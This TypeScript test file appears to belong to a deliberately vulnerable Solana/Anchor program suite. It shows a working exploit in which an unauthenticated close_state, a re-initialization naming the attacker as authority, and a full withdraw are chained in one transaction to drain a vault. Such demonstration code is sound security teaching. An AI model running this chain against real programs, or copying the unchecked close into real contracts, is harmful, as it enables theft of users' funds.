/**
 * VULN 16 — account close + resurrection (use-after-free) in ONE transaction.
 *
 * `close_state` has no authority check and deallocates the state PDA
 * completely (0 lamports + 0 data + system owner). The attacker chains:
 *   close_state -> initialize(authorized = attacker) -> withdraw(all vault)
 * into a single atomic transaction and drains the whole protocol vault.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  sendTx, solBalance, BN, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln16 close + resurrect state / vault drain", () => {
  const program = anchorProgram("vuln16_close_reuse", PROG_IDS.vuln16);
  const state = findPda([seedsBuf("state")[0]], PROG_IDS.vuln16)[0];
  const vault = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln16)[0];

  let honestUser: any, attacker: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    honestUser = await newFundedKeypair();
    attacker = await newFundedKeypair();

    await program.methods.initialize()
      .accounts({ state, authorized: provider.wallet.publicKey, payer: provider.wallet.publicKey })
      .rpc();
    await program.methods.initVault()
      .accounts({ vault, payer: provider.wallet.publicKey })
      .rpc();

    // Honest user deposits 20 SOL into the protocol vault.
    await program.methods.deposit(new BN(20 * LAMPORTS_PER_SOL))
      .accounts({ vault, user: honestUser.publicKey })
      .signers([honestUser]).rpc();
  });

  it("honest attacker attempt (withdraw without authority) is rejected", async () => {
    try {
      await program.methods.withdraw(new BN(LAMPORTS_PER_SOL))
        .accounts({ state, vault, authorized: attacker.publicKey, recipient: attacker.publicKey })
        .signers([attacker]).rpc();
      assert.fail("withdraw must fail for a non-authorized key");
    } catch (e: any) {
      assert.include(String(e), "NotAuthorized");
    }
  });

  it("close -> resurrect -> drain, all inside one transaction", async () => {
    const vaultBefore = await solBalance(vault);
    assert.isAtLeast(vaultBefore, 20 * LAMPORTS_PER_SOL);

    const attackerBefore = await solBalance(attacker.publicKey);

    // One atomic transaction, three instructions:
    const closeIx = await program.methods.closeState()
      .accounts({ state, refund: attacker.publicKey })
      .instruction();
    const initIx = await program.methods.initialize()
      .accounts({ state, authorized: attacker.publicKey, payer: attacker.publicKey })
      .instruction();
    // withdraw the ENTIRE usable vault balance; 2M lamports stay behind to
    // keep the vault data account rent-exempt (the runtime rejects a tx
    // that leaves an account below its rent-exempt minimum).
    const all = vaultBefore - 2_000_000;
    const withdrawIx = await program.methods.withdraw(new BN(all))
      .accounts({ state, vault, authorized: attacker.publicKey, recipient: attacker.publicKey })
      .instruction();

    await sendTx([closeIx, initIx, withdrawIx], [attacker]);

    const vaultAfter = await solBalance(vault);
    assert.isBelow(vaultAfter, 2_000_001); // vault emptied (rent-only residue)
    const stolen = (await solBalance(attacker.publicKey)) - attackerBefore;
    assert.isAtLeast(stolen, all - 10_000);

    // The resurrected state now names the attacker as the authority.
    const st = await program.account.vaultState.fetch(state);
    assert.equal(st.authorized.toString(), attacker.publicKey.toString());
  });
});
